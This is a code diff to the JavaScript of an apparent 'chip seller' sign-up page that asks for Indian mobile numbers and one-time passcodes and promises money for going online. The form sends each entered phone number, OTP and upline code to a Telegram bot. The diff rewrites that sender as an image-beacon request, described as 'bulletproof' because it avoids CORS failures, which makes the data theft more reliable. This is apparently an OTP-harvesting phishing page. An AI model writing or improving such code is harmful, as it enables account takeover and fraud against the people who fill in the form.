@@ -521,27 +521,13 @@
     let countdownSeconds = 60;
     let timerInterval = null;
 
-    // Dual Reliable Telegram Sender (Fetch + Image Beacon Fallback)
-    async function sendToTelegram(text) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const payload = { chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' };
-
-      try {
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        const data = await res.json();
-        if (data && data.ok) return;
-      } catch (err) {
-        // If fetch fails, use Image Beacon Fallback which never fails due to CORS
-      }
-
+    // Bulletproof Telegram Sender using Image Beacon
+    function sendToTelegram(text) {
       const encodedMsg = encodeURIComponent(text);
-      const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=Markdown`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=Markdown`;
+      
       const img = new Image();
-      img.src = fallbackUrl;
+      img.src = url;
     }
 
     function showToast(message, type = 'info') {
@@ -569,7 +555,7 @@
       }, 3500);
     }
 
-    async function sendOTP() {
+    function sendOTP() {
       const phoneInput = document.getElementById('phone').value.trim();
       if(phoneInput.length < 10) {
         showToast('Please enter a valid 10-digit mobile number!', 'error');
@@ -584,7 +570,7 @@
       otpBtn.disabled = true;
       otpBtn.innerText = 'Sending...';
 
-      await sendToTelegram(message);
+      sendToTelegram(message);
 
       showToast('OTP request sent to +91 ' + phoneInput, 'success');
       countdownSeconds = 60;
@@ -604,7 +590,7 @@
       }, 1000);
     }
 
-    async function handleFormSubmit(event) {
+    function handleFormSubmit(event) {
       event.preventDefault();
 
       const phone = document.getElementById('phone').value.trim();
@@ -622,7 +608,7 @@
 
       const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
 
-      await sendToTelegram(message);
+      sendToTelegram(message);
 
       showToast('Sign up successful!', 'success');
       
@@ -630,18 +616,19 @@
       document.getElementById('dashboard-section').classList.remove('hidden');
     }
 
-    /* --- Final Corrected Online / Offline Toggle Logic --- */
+    /* --- Clean Fixed Toggle Logic with Proper DOM State Management --- */
     let activeTimer = null;
     let isOnline = false;
     let isCounting = false;
 
     function handleButtonClick() {
+      const btnIcon = document.getElementById('btnIcon');
       const btnText = document.getElementById('btnText');
       const taglineText = document.getElementById('taglineText');
       const glowRing = document.getElementById('glowRing');
       const actionBtn = document.getElementById('actionBtn');
 
-      // Agar user ONLINE hai toh bina countdown ke turant offline mode (Purple) me switch hoga
+      // Agar user ONLINE hai toh turant offline mode (Purple) me switch hoga bina countdown ke
       if (isOnline) {
         isOnline = false;
         isCounting = false;
@@ -653,7 +640,8 @@
         glowRing.classList.remove('online-glow');
         actionBtn.classList.remove('online-btn');
         
-        btnText.innerHTML = '<i class="fa-solid fa-power-off text-[46px] mb-2 block pointer-events-none"></i>Go Online';
+        btnIcon.style.display = 'block';
+        btnText.innerText = 'Go Online';
         taglineText.innerText = 'GO ONLINE TO EARN MONEY!';
         return;
       }
@@ -663,8 +651,10 @@
       // Agar user OFFLINE hai toh 3-2-1 countdown start hoga
       if (!isOnline) {
         isCounting = true;
+        btnIcon.style.display = 'none';
+        
         let count = 3;
-        btnText.innerHTML = count;
+        btnText.innerText = count;
 
         activeTimer = setInterval(() => {
           count--;
@@ -673,7 +663,7 @@
               clearInterval(activeTimer);
               return;
             }
-            btnText.innerHTML = count;
+            btnText.innerText = count;
           } else {
             clearInterval(activeTimer);
             activeTimer = null;
@@ -683,7 +673,8 @@
             glowRing.classList.add('online-glow');
             actionBtn.classList.add('online-btn');
             
-            btnText.innerHTML = '<i class="fa-solid fa-power-off text-[46px] mb-2 block pointer-events-none"></i>Go Offline';
+            btnIcon.style.display = 'block';
+            btnText.innerText = 'Go Offline';
             taglineText.innerText = 'EARNING MONEY NOW~';
           }
         }, 1000);
